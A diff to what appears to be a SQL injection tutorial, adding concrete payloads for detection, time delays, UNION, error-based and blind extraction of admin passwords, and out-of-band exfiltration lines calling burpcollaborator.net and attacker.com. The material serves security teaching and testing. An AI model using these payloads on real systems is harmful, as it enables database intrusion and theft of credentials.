@@ -101,11 +101,65 @@ SQL injection is a critical web security vulnerability that allows an attacker t
 SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This includes URL query parameters, form fields, HTTP headers (like User-Agent or Referer), and cookies.
 
 - **Single Quote Test:** Submitting the single quote character `'` (or double quote `"`) and looking for database errors or other anomalies in the response. If the application crashes or throws a syntax error (e.g., "Unclosed quotation mark"), it strongly indicates that the input is breaking out of the intended string literal and is being evaluated as SQL code.
+  ```sql
+  '
+  "
+  ```
 - **Boolean Inference:** Submitting SQL-specific syntax that evaluates to a known Boolean state and observing differences in the application's response (e.g., different content, missing elements, or different HTTP status codes).
-  - Test 1 (TRUE): `id=1 AND 1=1` (Should return the normal page data)
-  - Test 2 (FALSE): `id=1 AND 1=2` (Should return an empty page, a 'not found' message, or an error)
-- **Time Delay Triggers:** Submitting payloads designed to trigger time delays when executed within an SQL query and looking for differences in the time taken for the server to respond. Examples include `WAITFOR DELAY '0:0:10'` (MSSQL) or `SLEEP(10)` (MySQL). If the page takes exactly 10 extra seconds to load, it's vulnerable.
-- **Out-of-Band (OAST) Payloads:** Submitting payloads designed to trigger an out-of-band network interaction (like an external DNS lookup or HTTP request) when executed within an SQL query. The attacker monitors their external server (like Burp Collaborator) for any resulting interactions.
+  - Test 1 (TRUE): Should return the normal page data.
+    ```sql
+    id=1 AND 1=1
+    id=1' AND '1'='1
+    ```
+  - Test 2 (FALSE): Should return an empty page, a 'not found' message, or an error.
+    ```sql
+    id=1 AND 1=2
+    id=1' AND '1'='2
+    ```
+- **Time Delay Triggers:** Submitting payloads designed to trigger time delays when executed within an SQL query and looking for differences in the time taken for the server to respond. If the page takes exactly 10 extra seconds to load, it's vulnerable.
+  - **MSSQL:**
+    ```sql
+    WAITFOR DELAY '0:0:10'
+    '; WAITFOR DELAY '0:0:10'--
+    ```
+  - **MySQL:**
+    ```sql
+    SLEEP(10)
+    ' OR SLEEP(10)--
+    ```
+  - **PostgreSQL:**
+    ```sql
+    pg_sleep(10)
+    ' || pg_sleep(10)--
+    ```
+- **Out-of-Band (OAST: Out-of-band Application Security Testing) Payloads:** Submitting payloads designed to trigger an out-of-band network interaction (like an external DNS lookup or HTTP request) when executed within an SQL query. The attacker monitors their external server (like Burp Collaborator) for any resulting interactions.
+  - **Oracle:**
+    ```sql
+    SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT USER)||'.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+    ```
+  - **MSSQL:**
+    ```sql
+    EXEC master..xp_dirtree '//burpcollaborator.net/a'
+    ```
+
+### 3.2 Confirming Vulnerability
+Based on the manual detection techniques, you can confirm a web app is vulnerable if the application processes your input as executable SQL code rather than string data:
+
+**Single Quote Test (`'` or `"`):**
+- **Vulnerable if:** The application throws a database error (e.g., "Syntax error in SQL statement" or "Unclosed quotation mark") or simply crashes (HTTP 500 error). This happens because the quote broke the database query's syntax, proving your input was executed directly by the database.
+- **Not Vulnerable if:** The quote is treated as a normal character (e.g., it just searches for a product named `'` and returns "0 results" without crashing).
+
+**Boolean Inference (Testing TRUE vs. FALSE):**
+- **Vulnerable if:** The application behaves differently between the TRUE test (`id=1 AND 1=1`) and the FALSE test (`id=1 AND 1=2`). For example, if the TRUE test loads the page normally, but the FALSE test returns a blank page, a "Product Not Found" message, or changes the HTTP status code. This proves you are controlling the `WHERE` clause logic.
+- **Not Vulnerable if:** Both tests return the exact same result (like a normal page or a standard "Invalid Input" error).
+
+**Time Delay Triggers (e.g., `SLEEP(10)`):**
+- **Vulnerable if:** The web page takes exactly 10 extra seconds to load before returning the response. This proves the database actually executed your injected sleep command.
+- **Not Vulnerable if:** The page loads instantly as usual.
+
+**Out-of-Band (OAST) Payloads:**
+- **Vulnerable if:** You check your external logging server (like Burp Collaborator) and see an incoming DNS lookup or HTTP request originating from the target's database server. This proves the database executed a command to reach out to you over the network.
+- **Not Vulnerable if:** You receive no network interactions on your external server.
 
 ## 4. Exploiting SQL Injections
 
@@ -152,31 +206,53 @@ In-band SQL Injection is the most common and easy-to-exploit category. It occurs
 #### 5.1.1 Error-based SQLi
 Relies on intentionally forcing the database to generate an error message that contains information about the structure of the database or the data itself.
 - **Usage:** An attacker might use mathematical errors (like divide-by-zero) or type conversion errors to force the database to reveal data in the error string. For example, trying to convert a string containing the admin's password into an integer will throw an error displaying that exact string.
+- **Example Payload:** Injecting a type conversion error in MSSQL to extract the database version:
+  ```sql
+  ' OR 1=CONVERT(int, (SELECT @@version))--
+  ```
 - **Mitigation Note:** While detailed SQL errors are very useful during development for debugging, they should always be disabled on a live production site to prevent this attack.
 
 #### 5.1.2 Union-based SQLi
 Leverages the `UNION` SQL operator to combine the results of the original `SELECT` statement with the results of a maliciously injected `SELECT` statement into a single HTTP response that is rendered on the page.
 - **Requirements:** The injected query must have the exact same number of columns and compatible data types as the original query. Attackers typically use `ORDER BY` clauses to determine the column count before attempting the `UNION`.
-- **Example Payload:** `' UNION SELECT username, password FROM users--`
+- **Example Payload:** Extracting the usernames and passwords from the `users` table, assuming the original query returns two string columns:
+  ```sql
+  ' UNION SELECT username, password FROM users--
+  ```
 
 ### 5.2 Inferential SQLi (Blind SQLi)
 Unlike in-band SQLi, inferential SQLi takes much longer to exploit because no actual database data is transferred via the web application response. The attacker cannot see the direct result of the attack in-band, hence it is "blind." The attacker reconstructs the database structure character by character by asking the database true/false questions and observing the application's behavior.
 
 #### 5.2.1 Boolean-based (Content-based) Blind SQLi
 Relies on sending an SQL query that forces the application to return a different result (e.g., a "User exists" message vs. a "User not found" message) depending on whether the injected query evaluates to TRUE or FALSE.
-- **Mechanism:** The attacker extracts data systematically. For example, using the `SUBSTRING()` function: `AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'A'`. If the page loads normally, the first letter is 'A'. This requires hundreds of requests per word.
+- **Mechanism:** The attacker extracts data systematically. For example, using the `SUBSTRING()` function:
+  ```sql
+  ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'A'--
+  ```
+  If the page loads normally, the first letter of the password is 'A'. If it returns a missing item or error page, the letter is not 'A'. This requires hundreds of requests per word.
 
 #### 5.2.2 Time-based Blind SQLi
 When the application returns the exact same content regardless of whether the query is true or false (thwarting boolean attacks), attackers use time-based techniques. It relies on forcing the database to wait for a specified amount of time (in seconds) before responding if a condition is met.
-- **Mechanism:** The response time indicates to the attacker whether the result of the query is TRUE or FALSE. If the condition is true, the database pauses (e.g., `IF (condition) SLEEP(10)`); if false, it responds immediately.
+- **Mechanism:** The response time indicates to the attacker whether the result of the query is TRUE or FALSE.
+- **Example Payload:** If the first letter of the password is 'A', the database will pause for 10 seconds (MySQL):
+  ```sql
+  ' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'A', SLEEP(10), 0)--
+  ```
 
 ### 5.3 Double Query Injection
 A more advanced form of Error-based injection. It involves executing a subquery that purposefully triggers a specific type of error (like a duplicate key error in an aggregate function) to extract data. It is often used when standard error messages are suppressed but certain aggregate errors still bubble up to the interface.
+- **Example Payload:** Triggering a Duplicate Key Error in MySQL to extract the database version:
+  ```sql
+  ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--
+  ```
 
 ### 5.4 Out-of-band SQLi (OAST)
 Out-of-band SQL Injection is uncommon because it depends on specific, often restricted, features being enabled on the database server. It occurs when an attacker is unable to use the same channel to launch the attack and gather results, and inferential techniques are too unstable or slow.
 - **Mechanism:** Relies on the database server’s ability to make external DNS or HTTP requests to deliver data to a server controlled by the attacker.
-- **Examples:** Using Microsoft SQL Server’s `xp_dirtree` command to trigger an SMB/DNS request, or Oracle Database’s `UTL_HTTP` package to send sensitive data via HTTP GET requests to the attacker's server.
+- **Example Payload:** Using Microsoft SQL Server’s `xp_dirtree` command to trigger an SMB/DNS request, appending the database user to the attacker's subdomain:
+  ```sql
+  '; DECLARE @data VARCHAR(1024); SELECT @data = (SELECT SYSTEM_USER); EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\foo"');--
+  ```
 
 ## 6. Second-Order SQL Injection
 First-order SQL injection occurs when user input is immediately processed and incorporated into a vulnerable SQL query in the same HTTP request. 
